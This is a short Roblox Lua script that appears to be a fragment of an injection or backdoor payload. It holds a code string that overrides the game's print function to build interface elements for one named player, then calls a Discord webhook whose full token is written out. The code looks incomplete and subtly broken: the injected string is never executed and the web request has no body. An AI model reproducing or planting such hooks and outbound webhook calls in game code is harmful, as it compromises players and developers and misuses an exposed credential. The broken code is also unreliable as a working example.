local injected = [[
local oldPrint = print
function print(...)
	local toast = game.Players:FindFirstChild("toastzinsky")
	if not toast then
		oldPrint("missing player") return
	end
	local gui = Instance.new("ScreenGui", toast:WaitForChild("PlayerGui"))
	local frame = Instance.new("Frame", gui)
	oldPrint(...)
end
]]
game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1402454237279162379/_2lSYVuS5JLN71d-GyQGw8u0melrIb6ERIm9Wxg05PyHG6jzuyu7kAuSGbFB_3HWn8Ku")
